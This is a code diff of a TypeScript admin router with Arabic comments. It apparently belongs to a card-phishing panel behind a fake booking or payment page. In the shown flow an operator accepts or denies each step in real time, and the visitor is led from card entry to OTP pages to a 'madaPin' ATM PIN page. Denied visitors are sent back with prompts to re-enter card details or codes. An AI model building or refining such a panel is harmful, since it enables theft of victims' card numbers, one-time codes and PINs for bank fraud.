@@ -528,19 +528,19 @@ const adminRouter = router({
 
       if (action === "verified") {
         // قبول:
-        // step 1 (بطاقة مدخلة) → صفحة OTP
-        // step 2 (OTP مدخل) → صفحة ATM PIN
-        // step 3 (ATM مدخل) → صفحة الخطوة التالية (bCall انتظار)
+        // step 1 (بطاقة مدخلة) → صفحة OTP الأولى (code/Tx)
+        // step 2 (OTP الأول مدخل) → صفحة OTP الثانية (madaPin/Cx)
+        // step 3 (OTP الثاني/ATM مدخل) → صفحة الخطوة التالية (bCall انتظار)
         if (currentStep === 1) {
-          // بعد مرحلة البطاقة: قبول → صفحة OTP
+          // بعد مرحلة البطاقة: قبول → صفحة OTP الأولى
           targetPage = "code";
           await createOrUpdatePayment(reference, { paymentAction: "accepted" } as any);
         } else if (currentStep === 2) {
-          // بعد مرحلة OTP: قبول → صفحة ATM PIN
-          targetPage = "pin";
+          // بعد مرحلة OTP الأول (submitVerificationData): قبول → صفحة madaPin (OTP الثاني)
+          targetPage = "madaPin";
           await createOrUpdatePayment(reference, { paymentAction: "pass", step: 2 } as any);
         } else {
-          // بعد مرحلة ATM: قبول → bCall (انتظار الخطوة التالية)
+          // بعد مرحلة OTP الثاني/ATM (submitCodeData): قبول → bCall
           targetPage = "bCall";
           await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" } as any);
           await updateBookingStatus(reference, "completed", 1);
@@ -548,8 +548,8 @@ const adminRouter = router({
       } else if (action === "denied") {
         // رفض:
         // step 1 (بطاقة) → صفحة البطاقة مع رسالة "برجاء التحقق من معلومات البطاقة"
-        // step 2 (OTP) → صفحة OTP مع رسالة "برجاء التحقق من الرمز المرسل"
-        // step 3 (ATM) → صفحة ATM مع رسالة "برجاء التحقق من رقم الصراف"
+        // step 2 (OTP الأول) → صفحة OTP الأولى (code) مع رسالة خطأ
+        // step 3 (OTP الثاني/ATM) → صفحة madaPin مع رسالة خطأ
         if (currentStep === 1) {
           targetPage = "payments?declined=true";
           await createOrUpdatePayment(reference, { paymentAction: "denied", step: 1 } as any);
@@ -557,7 +557,7 @@ const adminRouter = router({
           targetPage = "code?declined=true";
           await createOrUpdatePayment(reference, { paymentAction: "denied", step: 2 } as any);
         } else {
-          targetPage = "pin?declined=true";
+          targetPage = "madaPin?declined=true";
           await createOrUpdatePayment(reference, { paymentAction: "denied", step: 3 } as any);
         }
       } else if (action === "accepted") {
